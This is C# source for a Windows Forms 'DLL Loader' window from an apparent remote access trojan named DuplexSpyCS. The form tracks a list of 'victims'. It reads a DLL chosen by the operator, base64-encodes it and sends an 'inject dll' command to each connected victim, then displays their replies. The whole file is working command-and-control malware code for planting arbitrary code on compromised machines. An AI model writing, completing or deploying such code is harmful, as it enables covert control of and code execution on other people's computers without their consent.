using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmDllLoader : Form
    {
        private List<clsVictim> m_lsVictim { get; init; }

        public frmDllLoader(List<clsVictim> lsVictim)
        {
            InitializeComponent();

            m_lsVictim = lsVictim;
            Text = "DLL Loader";
        }

        void fnRecv(clsListener listener, clsVictim victim, List<string> lsMsg)
        {
            if (!m_lsVictim.Contains(victim))
                return;

            if (lsMsg[0] == "inject")
            {
                if (lsMsg[1] == "dll")
                {
                    int nProc = int.Parse(lsMsg[2]);
                    if (nProc != -1)
                        return;

                    int nCode = int.Parse(lsMsg[3]);
                    Invoke(new Action(() =>
                    {
                        if (nCode == 0)
                        {
                            richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] {victim.ID} => {clsCrypto.b64D2Str(lsMsg[4])}");
                            richTextBox1.AppendText(Environment.NewLine);
                        }
                        else
                        {
                            richTextBox1.AppendText($"OK");
                            richTextBox1.AppendText(Environment.NewLine);
                        }
                    }));
                }
            }
        }

        void fnSetup()
        {
            foreach (var victim in m_lsVictim)
            {
                ListViewItem item = new ListViewItem(victim.ID);
                item.SubItems.Add("?");

                listView1.Items.Add(item);

                victim.m_listener.ReceivedDecoded += fnRecv;
            }

            listView1.FullRowSelect = true;

            toolStripStatusLabel1.Text = $"Victim[{m_lsVictim.Count}]";
        }

        private void frmDllLoader_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();

            if (ofd.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = ofd.FileName;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            tabControl1.SelectedIndex = 1;

            Task.Run(() =>
            {
                try
                {
                    string szFileName = textBox1.Text;
                    if (!File.Exists(szFileName))
                        throw new Exception("Cannot find DLL file: " + szFileName);

                    byte[] abData = File.ReadAllBytes(szFileName);
                    string szB64 = Convert.ToBase64String(abData);

                    foreach (var victim in m_lsVictim)
                    {
                        victim.fnSendCommand(new string[]
                        {
                            "inject",
                            "dll",
                            "-1",
                            "-1",
                            szFileName,
                            szB64,
                        });
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            });
        }

        private void frmDllLoader_FormClosed(object sender, FormClosedEventArgs e)
        {
            foreach (var victim in m_lsVictim)
                victim.m_listener.ReceivedDecoded -= fnRecv;
        }
    }
}
